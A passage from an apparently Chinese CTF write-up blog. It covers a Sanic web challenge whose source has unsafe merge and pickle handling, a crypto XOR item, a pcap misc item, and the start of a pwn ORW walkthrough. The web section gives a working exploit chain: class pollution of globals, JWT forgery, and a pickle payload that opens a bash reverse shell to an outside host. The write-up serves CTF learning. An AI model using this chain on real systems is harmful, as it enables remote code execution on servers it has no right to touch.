class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json, file <span class="keyword">as</span> file_, text, redirect</span><br><span class="line"><span class="keyword">from</span> sanic_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> secret_key</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;App&quot;</span>)</span><br><span class="line">pickle_file = <span class="string">&quot;data.pkl&quot;</span></span><br><span class="line">my_object = &#123;&#125;</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">safe_modules = &#123;</span><br><span class="line">    <span class="string">&#x27;math&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;collections&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safe_names = &#123;</span><br><span class="line">    <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;timedelta&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;namedtuple&#x27;</span>, <span class="string">&#x27;deque&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;defaultdict&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> safe_modules <span class="keyword">and</span> name <span class="keyword">in</span> safe_names:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CORS(app, supports_credentials=<span class="literal">True</span>, origins=[<span class="string">&quot;http://localhost:8000&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = jwt.decode(token, <span class="built_in">str</span>(secret_key), algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token expired&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> func(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>(<span class="params">request</span>):</span><br><span class="line">    file = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> text(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/upload.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;No file provided&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    file_object = file[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">isinstance</span>(file, <span class="built_in">list</span>) <span class="keyword">else</span> file</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new_data = restricted_loads(file_object.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_object.update(new_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pickle_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(my_object, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;Dangerous pickle file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        NewUser = User(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">        merge(request.json, NewUser)</span><br><span class="line">        users.append(NewUser)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Register Success!&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/login&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        username = request.json.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.json.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username or password missing&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((u <span class="keyword">for</span> u <span class="keyword">in</span> users <span class="keyword">if</span> u.username == username), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">if</span> user.password == password:</span><br><span class="line">                data = &#123;<span class="string">&quot;user&quot;</span>: username, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">                data[<span class="string">&#x27;exp&#x27;</span>] = <span class="built_in">int</span>(time.time()) + <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">                token = jwt.encode(data, <span class="built_in">str</span>(secret_key), algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                response = json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/upload&quot;</span>&#125;)</span><br><span class="line">                response.cookies[<span class="string">&quot;token&quot;</span>] = token</span><br><span class="line">                response.headers[<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid password&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;, status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>题目给了源码,</p><ul><li>存在merge,并且User类有<code>__init__</code>,一眼原型链污染,可以污染到<code>global</code>全局变量</li><li>存在<code>RestrictedUnpickler</code>并重写了<code>find_class</code>,可以绕过来<code>pickle</code>反序列化</li></ul><p>​所以这道题思路就是先利用原型链污染来污染<code>secret_key</code>伪造<code>admin</code>，再污染<code>safe_modules</code>和<code>safe_names</code>来绕过<code>RestrictedUnpickler</code>限制即可.</p><p>源码中<code>/register</code>路由可以进行原型链污染</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093950109-474360410.png" alt="image-20241019162312868"></p><p>在<code>/upload</code>路由可以上传pkl文件来触发pickle反序列化.</p><p>所以直接先传</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;secret_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>污染<code>secret_key</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094025395-485307447.png" alt="image-20241019162519604"></p><p>之后jwt伪造</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094030306-835463532.png" alt="image-20241019162618743"></p><p>再污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_names&quot;</span> <span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;getattr&quot;</span><span class="punctuation">,</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="string">&quot;dict&quot;</span><span class="punctuation">,</span><span class="string">&quot;globals&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">和</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_modules&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;builtins&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后根据<a href="https://goodapple.top/archives/1069">博客</a>里面绕过<code>builtins</code>的例子写<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dddd.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type of &#x27;data&#x27;: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Module of &#x27;data&#x27;: <span class="subst">&#123;data.__module__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(data, <span class="string">&#x27;__module__&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传即可</p><p>PS:这shell弹的太慢了,我还以为环境死了差点关了…</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094112459-1685459773.png" alt="image-20241019162930878"></p><h1>Crypto</h1><h2 id="xor">xor</h2><p>题目描述</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimic is a keyword.</span><br><span class="line"><span class="number">0</span>b<span class="number">050</span><span class="keyword">c</span><span class="number">0e180</span>e<span class="number">585</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">52555</span><span class="keyword">c</span><span class="number">5544545</span><span class="keyword">c</span><span class="number">0</span>a<span class="number">0</span>f<span class="number">44535</span>f<span class="number">0</span>f<span class="number">5e445658595844050</span>f<span class="number">5</span>d<span class="number">0</span>f<span class="number">0</span>f<span class="number">55590</span><span class="keyword">c</span><span class="number">555e5</span>a<span class="number">0914</span></span><br></pre></td></tr></table></figure><p>直接给gpt，秒了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094135992-1445668991.png" alt="image-20241019163249407"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094156218-2020019155.png" alt="image-20241019163313547"></p><h1>Misc</h1><h2 id="ezflag">ezflag</h2><p>解压压缩包有个流量包,拿工具跑出来一个压缩包</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094229732-112185337.png" alt="image-20241019163729644"></p><p>解压后有个<code>flag.zip</code>，但是解压不出来，拿file看一下发现是一个png</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094425840-1389928001.png" alt="image-20241019163915023"></p><p>之后改一下后缀即可得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094352731-1655859914.png" alt="image-20241019163906271"></p><h1>pwn</h1><h2 id="signin-revenge">signin revenge</h2><h3 id="题目libc环境">题目libc环境</h3><blockquote><p>那道题目的时候，发现题目是直接跑不起来的。开始以为是沙箱的问题，还是太菜了。其实更换题目libc环境的问题</p><p>这里跟换一下题目的libc环境，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed  libc.so.6 ./libc.so.6 vuln</span><br><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2  vuln</span><br></pre></td></tr></table></figure><p>ldd vuln查看一下更换是否成功。</p><p>然后就可以正常运行了。</p><p>踩坑点：注意要把给定的libc文件进行授权。并且要在管理员模式下授权。</p><p>这里注意不换也行，正常打远程应该不影响做题，但是复现跑本地就会遇到麻烦了。但是如果是你是kali的话。把他俩放在同一文件下kali会自行匹配ld文件和libc文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ ldd vuln</span><br><span class="line">linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff6fb85000</span>)</span><br><span class="line">./libc.so<span class="number">.6</span> (<span class="number">0x00007fce115dc000</span>)    <span class="comment">//---------------------------------------------&gt;&gt;&gt;ld文件</span></span><br><span class="line">./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fce117d0000</span>)<span class="comment">//-------&gt;&gt;&gt;libc文件</span></span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ </span><br></pre></td></tr></table></figure></blockquote><p>先日常检查一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/2222/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ </span><br></pre></td></tr></table></figure><p>正常的NX和got表可写</p><p>丢进ida里面看看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets move and pwn!&quot;</span>);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去可以明显的看见一个沙箱函数和我们所要纯在漏洞的read函数</p><p>简单看一下沙箱函数</p><p>这里我问了一下gpt，其实大概我的理解就是提醒我们使用ORW</p><h3 id="ORW">ORW</h3><p>首先通过<code>open函数</code>向<code>bss段上</code>中写入<code>b'./flag\x00\x00'</code>，并将<code>b'./flag\x00\x00'</code>作为<code>open函数</code>的参数，构造<code>open(b'./flag\x00\x00')</code>用来打开当前目录名为flag的文件，其中0表示只读方式打开。然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 